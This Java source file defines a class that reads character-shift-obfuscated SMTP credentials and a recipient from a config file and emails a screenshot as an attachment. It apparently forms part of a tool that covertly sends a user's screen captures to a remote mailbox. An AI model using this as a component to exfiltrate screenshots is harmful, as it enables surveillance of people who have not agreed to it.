package sendemail;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.AddressException;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMultipart;

/**
 * Class prepares email with a screenshot and then sends them to the email 
 * address indicated.
 * 
 * @author Anonymous
 */

public class SendEmail {
    
    /**
     *  Method sends a screenshot to the email address indicated.
     * 
     * @param fileName file with screenshot
     * @throws AddressException 
     * @throws javax.mail.MessagingException 
     */

    public void send(String fileName) throws AddressException, javax.mail.MessagingException {

        HashMap<String, String> propertiesMap  = getProperties();
        
        Properties properties = System.getProperties();

        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", propertiesMap.get("host"));
        properties.put("mail.smtp.user", propertiesMap.get("login"));
        properties.put("mail.smtp.password", propertiesMap.get("password"));
        properties.put("mail.smtp.port", Integer.parseInt(propertiesMap.get("port")));
        properties.put("mail.smtp.auth", "true");

        Session session = Session.getDefaultInstance(properties);

        Message message = new MimeMessage(session);
        
        message.setFrom(new InternetAddress(propertiesMap.get("login")));
        message.setRecipient(Message.RecipientType.TO, new InternetAddress(propertiesMap.get("to")));
        message.setSubject(propertiesMap.get("subject"));
        
        Multipart multipart = new MimeMultipart();
       
        BodyPart messageBodyPart = new MimeBodyPart();
        
        messageBodyPart.setText("trololo");
        multipart.addBodyPart(messageBodyPart);
        
        messageBodyPart = new MimeBodyPart();
        DataSource source = new FileDataSource(fileName);
        messageBodyPart.setDataHandler(new DataHandler(source));
        messageBodyPart.setFileName(fileName);
        multipart.addBodyPart(messageBodyPart);

        message.setContent(multipart);

        System.out.println("Sending...");
        
        Transport transport = session.getTransport("smtp");
        
        transport.connect(propertiesMap.get("host"), propertiesMap.get("login"),
                propertiesMap.get("password"));
        
        transport.sendMessage(message, message.getAllRecipients());
        transport.close();
        
        System.out.println("Mail sent successfully");
    }
    
    /**
     * Method loads properties from file.
     * 
     * @return HashMap with properties.
     */
    
    private HashMap getProperties(){
        
        Properties properties = new Properties();        
 
        HashMap <String, String> propertiesMap = new HashMap<>();

	try {
            InputStream input = new FileInputStream("config.properties");
            properties.load(input);
            
            propertiesMap.put("login", buildString(properties.getProperty("login")));
            propertiesMap.put("password", buildString(properties.getProperty("password")));
            propertiesMap.put("host", buildString(properties.getProperty("host")));
            propertiesMap.put("port", buildString(properties.getProperty("port")));
            propertiesMap.put("subject", buildString(properties.getProperty("subject")));
            propertiesMap.put("to", buildString(properties.getProperty("to")));

	} catch (IOException io) {
		io.getMessage();
        }
        return propertiesMap;
    }
    
    /**
     * Method decrypts string.
     * 
     * @param stringToDecryption string to decryption
     * @return string before encryption.
     */
    
    private String buildString(String stringToDecryption) {

        StringBuilder stringBuilder = new StringBuilder();

        for (int i = 0; i < stringToDecryption.length(); i++) {
            stringBuilder.append((char) (stringToDecryption.charAt(i) + 10));
        }
        return stringBuilder.toString();
    }
}
